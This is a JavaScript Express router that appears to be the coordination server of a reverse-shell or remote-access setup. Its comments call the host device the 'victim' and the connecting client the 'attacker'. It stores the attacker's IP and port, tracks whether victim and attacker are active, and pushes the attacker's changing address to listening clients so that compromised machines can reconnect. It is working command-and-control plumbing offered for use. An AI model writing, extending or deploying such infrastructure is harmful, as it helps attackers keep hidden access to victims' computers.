const express = require('express');
const router = express.Router();

require('dotenv').config(); 
const API_KEY = process.env.API_KEY;
let IP = process.env.IP;
const UPLOAD_KEY = process.env.UPLOAD_KEY;

const clients = [];

// initial response data
const responsedata = {
    "ip": IP,
    "port": 1836,
    "host_inactive": "undefined",
    "connecting_client_inactive": "undefined"
};

function updateIp(newIp) {
    IP = newIp;
    responsedata.ip = newIp;
}

function updatePort(newPort) {
    responsedata.port = newPort;
}

function updateHostStatus(isActive) {
    responsedata.host_inactive = isActive ? "True" : "False";
}

function updateClientStatus(isActive) {
    responsedata.connecting_client_inactive = isActive ? "True" : "False";
}

// test
router.get('/', (req, res) => {  
    res.status(200).send('server active');
});

// get all info
router.get('/:key', (req, res) => {
    const key = req.params.key;
    if (key !== API_KEY) return res.status(401).send('Unauthorized');
    res.status(200).json(responsedata);
});

// update host device status ("victim")
router.patch('/host/:key/:status', (req, res) => {
    const key = req.params.key;
    const status = req.params.status;
    if (key !== UPLOAD_KEY) {
        return res.status(401).send('Unauthorized');
    }

    updateHostStatus(status === 'True');

    res.status(200).json(responsedata);
});

// update port number used in connection
router.patch('/port/:key/:newport', (req, res) => {
    const key = req.params.key;
    const newPort = req.params.newport;
    if (key !== UPLOAD_KEY) {
        return res.status(401).send('Unauthorized');
    }

    updatePort(newPort);

    res.status(200).json(responsedata);
});

// update ip and status as client ("attacker")
router.patch('/client/:key/:newip/:status', (req, res) => {
    const key = req.params.key;
    const newIp = req.params.newip;
    const status = req.params.status;
    if (key !== UPLOAD_KEY) {
        return res.status(401).send('Unauthorized');
    }
    
    updateIp(newIp);
    updateClientStatus(status === 'True');
    
    clients.forEach(client => {
        client.write(`${IP}\n`);
    });

    res.status(200).json(responsedata);

    console.log(responsedata);
});

module.exports = router;